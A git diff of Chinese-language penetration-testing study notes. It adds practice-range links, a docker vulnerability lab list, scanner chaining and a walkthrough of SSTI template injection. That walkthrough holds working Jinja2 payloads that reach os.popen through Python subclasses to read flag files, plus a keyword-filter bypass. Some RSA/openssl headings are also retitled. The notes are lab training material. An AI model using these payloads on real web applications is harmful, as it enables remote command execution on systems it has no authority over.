@@ -222,16 +222,87 @@ Burpsuite抓包，表单提交XML数据。修改XML表单数据。
 
 ## 专题二：内网渗透实战
 
+## 专题二：在线靶场
+http://39.103.63.109:8001/
+http://39.103.63.109:8005/
+1、渗透后不要留后门文件。
+2、不要删文件、不要修改源代码。
+
+## 专题二：docker靶场.zip
+
+php框架漏洞：thinkphp、laravel、Yii
+java框架漏洞：strusts2、spring
+java组件漏洞：shiro、log4j2、fastjson
+
+```shell
+docker-compose up -d # 启动docker环境
+docker ps # 查看web端口
+```
+
+配置docker镜像加速
+
+水滴工具箱有科学上网工具clash verge？选择虚拟网卡模式，点代理，点全局。
 
 
-## 专题三：SSTI漏洞挖掘
+## 专题二：自动化漏洞扫描
+1、常见漏扫软件
+开源漏扫软件nuclei、xray。可以去github下载。
+商业漏扫：AWVS、APPScan
 
+2、漏扫软件联动
+AWVS → 50483(APPScan) → 8083(Yakit) → 8080(Burpsuite) → 7777(Xray)
+参考
+https://www.cnblogs.com/backlion/p/18813730
 
+# SSTI模板注入漏洞挖掘
+
+## 中关村sstilabs靶场案例
+
+1. 判断什么语言编写。
+来判断语言，找对应的模板。
+
+    - php、jsp看url链接.php、.jsp。
+    - F12看中间件。
+    - 测试使其报错。
+
+2. 使用测试标记测试注入点。
+    {{2*3}}
+3. 魔术方法。
+
+    使用魔术方法。    {{.__class__.__base__.__subclasses__()}}
+    ```python
+    .__class__.__base__.__subclasses__()
+    ```
+
+    得到所有的类，找到命令执行的类，一般找os类。数下标。
+    ```python
+    .__class__.__base__.__subclasses__()[138].__init__
+    ```
+
+    子类实例化，找全局方法，一般找到popen()方法。windows下可以使用notepad或type命令。type相当于linux下的cat，但要加上.read()。
+     ```python
+    .__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('notepad flag.txt')
+      .__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('type flag.txt').read()
+    ```
+
+4. 关键字过滤的绕过。
+    cat写成tac或c*at。
+
+5. 工具
+    SSTImap，去github找。
+
+## 上海培训案例
+
+?name={%print([].__class__.__base__.__subclasses__()[132].__enter__.__globals__["pop"+"en"]("cat%20/flag").read())%}
+ __subclasses__()[132]是os._wrap_close类，在第132个。这个类有popen方法，需要先使用__enter__方法再调用__globals__可以获取方法内以字典的形式返回的方法、属性等值。
+
+ ssti payload：
+{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'}
 
 
 # RSA加解密
 
-## openssl生成密钥对
+## openssl生成密钥
 
 首先，生成一个密钥：
 ```shell
@@ -277,7 +348,7 @@ openssl rsautl -decrypt -in hello.enc -inkey private.key -out hello.dec
 RSA的核心是基于证书的公私钥。
 要注意的是生成的证书里面就完整的包含了公私钥,一定要分离出公钥后在分享出去。
 
-## 使用rsatool工具生成密钥对
+## 使用rsatool工具生成密钥
 
 安装过程如下：
 ```shell
@@ -1024,10 +1095,3 @@ XTerminal
 Yakit
 
 
-# SSTI模板注入
-
-?name={%print([].__class__.__base__.__subclasses__()[132].__enter__.__globals__["pop"+"en"]("cat%20/flag").read())%}
- __subclasses__()[132]是os._wrap_close类，在第132个。这个类有popen方法，需要先使用__enter__方法再调用__globals__可以获取方法内以字典的形式返回的方法、属性等值。
-
- ssti payload：
-{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'}
